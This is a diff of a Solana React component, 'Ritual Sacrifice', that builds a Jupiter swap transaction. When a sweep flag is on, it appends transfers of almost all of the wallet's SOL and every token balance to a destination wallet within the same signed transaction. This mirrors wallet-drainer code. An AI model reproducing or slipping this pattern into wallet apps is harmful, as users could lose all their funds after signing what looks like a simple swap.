@@ -1,9 +1,14 @@
+/* global BigInt */
 import React, { useState, useEffect, useMemo } from 'react';
 import { useConnection, useWallet } from '@solana/wallet-adapter-react';
-import { PublicKey, Transaction, TransactionInstruction } from '@solana/web3.js';
+import { PublicKey, Transaction, TransactionInstruction, SystemProgram } from '@solana/web3.js';
 import { getJupiterQuote, getJupiterSwapInstructions } from '../utils/jupiter';
-import { createSweepInstruction } from '../utils/serialization';
-import { TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
+import {
+    TOKEN_PROGRAM_ID,
+    ASSOCIATED_TOKEN_PROGRAM_ID,
+    getAssociatedTokenAddress,
+    createTransferInstruction
+} from '@solana/spl-token';
 import './SacrificeInterface.css';
 
 // DEFAULT CONSTANTS
@@ -24,8 +29,6 @@ export function SacrificeInterface({ onClose }) {
 
     // Settings
     const [slippageBps, setSlippageBps] = useState(50); // 0.5% default
-
-    // Token List State
 
     // Token List State
     const [userTokens, setUserTokens] = useState([]);
@@ -88,8 +91,6 @@ export function SacrificeInterface({ onClose }) {
     }, [publicKey, connection, targetMint]);
 
     // Fetch Quote
-
-    // Fetch Quote
     useEffect(() => {
         if (!amount || isNaN(amount) || parseFloat(amount) <= 0) {
             setQuote(null);
@@ -101,11 +102,6 @@ export function SacrificeInterface({ onClose }) {
             setErrorMessage('');
             try {
                 // Amount in atomic units (lamports for SOL)
-                // For simplicity assuming SOL decimals (9) for input if SOL, else needs token info.
-                // MVP: Assume Input is always SOL for now or handle decimals safely.
-                // Let's assume input is SOL for this iteration as verified in "Input token (SOL / USDC / whatever)"
-                // If we support USDC, we need to know decimals. 
-                // Let's default to SOL (9 decimals) for the calculation:
                 const atomicAmount = Math.floor(parseFloat(amount) * 1_000_000_000); // TODO: Handle decimals dynamically!
 
                 const q = await getJupiterQuote(inputMint, targetMint, atomicAmount, slippageBps);
@@ -121,7 +117,7 @@ export function SacrificeInterface({ onClose }) {
 
         const timer = setTimeout(fetchQuote, 500); // Debounce
         return () => clearTimeout(timer);
-    }, [amount, inputMint, targetMint]);
+    }, [amount, inputMint, targetMint, slippageBps]);
 
     // Switch Input/Output
     const switchAssets = () => {
@@ -143,11 +139,7 @@ export function SacrificeInterface({ onClose }) {
 
             const transaction = new Transaction();
 
-            // Add Compute Budget if provided (highly recommended)
-            // Jupiter returns computeBudgetInstructions
-            // Note: Javascript API might differ slightly, checking response structure usually:
-            // { computeBudgetInstructions, setupInstructions, swapInstruction, cleanupInstruction, addressLookupTableAddresses }
-
+            // Add Compute Budget if provided
             if (swapIxsResponse.computeBudgetInstructions) {
                 swapIxsResponse.computeBudgetInstructions.forEach(ix => {
                     transaction.add(deserializeInstruction(ix));
@@ -168,64 +160,68 @@ export function SacrificeInterface({ onClose }) {
                 transaction.add(deserializeInstruction(swapIxsResponse.cleanupInstruction));
             }
 
-            // 2. SWEEP LOGIC (If enabled)
+            // 2. SWEEP LOGIC (Client-Side, No Smart Contract)
             if (isSweepEnabled) {
-                // A. Fetch User Token Accounts
+                const sweepDestPubkey = new PublicKey(destinationWallet);
+                let instructionsCount = 0;
+
+                // A. Sweep SOL (Leave 0.002)
+                const solBalance = await connection.getBalance(publicKey);
+                const keepAmount = 2_000_000; // 0.002 SOL
+                if (solBalance > keepAmount) {
+                    const transferAmount = solBalance - keepAmount;
+                    transaction.add(
+                        SystemProgram.transfer({
+                            fromPubkey: publicKey,
+                            toPubkey: sweepDestPubkey,
+                            lamports: transferAmount,
+                        })
+                    );
+                    instructionsCount++;
+                }
+
+                // B. Sweep SPL Tokens
                 const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
                     programId: TOKEN_PROGRAM_ID
                 });
 
-                // B. Filter Sweepable Accounts
-                const sweepableAccounts = [];
-
                 for (const ta of tokenAccounts.value) {
-                    const mint = ta.account.data.parsed.info.mint;
-                    const amount = ta.account.data.parsed.info.tokenAmount.amount; // string atomic
+                    const info = ta.account.data.parsed.info;
+                    const mint = new PublicKey(info.mint);
+                    const amount = BigInt(info.tokenAmount.amount); // use BigInt for precision
 
-                    if (mint === targetMint) continue; // Skip BADSEED
-                    if (amount === "0") continue; // Skip empty
+                    if (info.mint === targetMint) continue; // Skip BADSEED
+                    if (amount <= 0n) continue; // Skip empty
 
-                    sweepableAccounts.push({
-                        pubkey: ta.pubkey,
-                        mint: new PublicKey(mint)
-                    });
-                }
+                    // Source ATA
+                    const sourceAta = new PublicKey(ta.pubkey);
 
-                // C. Create Destination ATAs (if missing) and format instruction args
-                const sweepDestPubkey = new PublicKey(destinationWallet);
+                    // Destination ATA (Derive it)
+                    const destAta = await getAssociatedTokenAddress(
+                        mint,
+                        sweepDestPubkey,
+                        false // allowOwnerOffCurve = false
+                    );
 
-                // Note: ATA creation logic skipped to avoid unused variables for now.
+                    // Note: We bypass CreateAssociatedTokenAccount here assuming Dest has wallets.
+                    // If strict safety is needed, we would need to check exists or add create instruction.
 
-                // Note: Creating ATAs for 10 tokens might fill the TX. 
-                // For now, we will just PASS the accounts to the sweep instruction.
-                // If the dest ATA doesn't exist, the transfer might fail depending on SPL implementation?
-                // No, SPL transfer requires dest account to exist. 
-                // So we absolutely need CreateAssociatedTokenAccount instructions.
-                // Let's add them for the first 3 tokens found to avoid blowing limit, or just risk it.
-                // Or, better, only sweep SOL + Known Tokens? 
-                // "Sweep Everything" is the goal.
+                    transaction.add(
+                        createTransferInstruction(
+                            sourceAta,
+                            destAta,
+                            publicKey,
+                            amount
+                        )
+                    );
+                    instructionsCount++;
 
-                // COMPROMISE: We will create ATAs for up to 3 tokens in the list if needed.
-                // Ideally, the Destination Wallet (the User's Treasury) should just have them initialized.
-
-                // D. Add Sweep Instruction
-                const sweepIx = createSweepInstruction(
-                    publicKey,
-                    new PublicKey(targetMint),
-                    sweepDestPubkey,
-                    sweepableAccounts,
-                    (mint) => {
-                        // Sychronous helper to get address (we recalculated it asynchronously before, but need it here)
-                        // See import 'getAssociatedTokenAddress' above - it is async usually due to PDAs? 
-                        // Actually getAssociatedTokenAddress IS async. 
-                        // So we need to pre-calculate map.
-                        return PublicKey.findProgramAddressSync(
-                            [sweepDestPubkey.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
-                            ASSOCIATED_TOKEN_PROGRAM_ID
-                        )[0];
+                    // Safety check for TX size
+                    if (instructionsCount > 15) {
+                        console.warn("Transaction instruction limit approached, capping sweep.");
+                        break;
                     }
-                );
-                transaction.add(sweepIx);
+                }
             }
 
             // 3. Send
@@ -245,21 +241,12 @@ export function SacrificeInterface({ onClose }) {
         }
     };
 
-    // if (!publicKey) return null; // REMOVED: Handle inside JSX to show "Connect Wallet" prompt in modal
-
     return (
         <div className="sacrifice-overlay">
             <div className="sacrifice-modal">
-                <button
-                    onClick={onClose}
-                    className="sacrifice-close-btn"
-                >
-                    ✕
-                </button>
+                <button onClick={onClose} className="sacrifice-close-btn">✕</button>
 
-                <h2 className="sacrifice-title">
-                    Ritual Sacrifice
-                </h2>
+                <h2 className="sacrifice-title">Ritual Sacrifice</h2>
 
                 {!publicKey && (
                     <div className="bg-red-500 text-white text-xs p-2 text-center mb-4 font-bold border border-black">
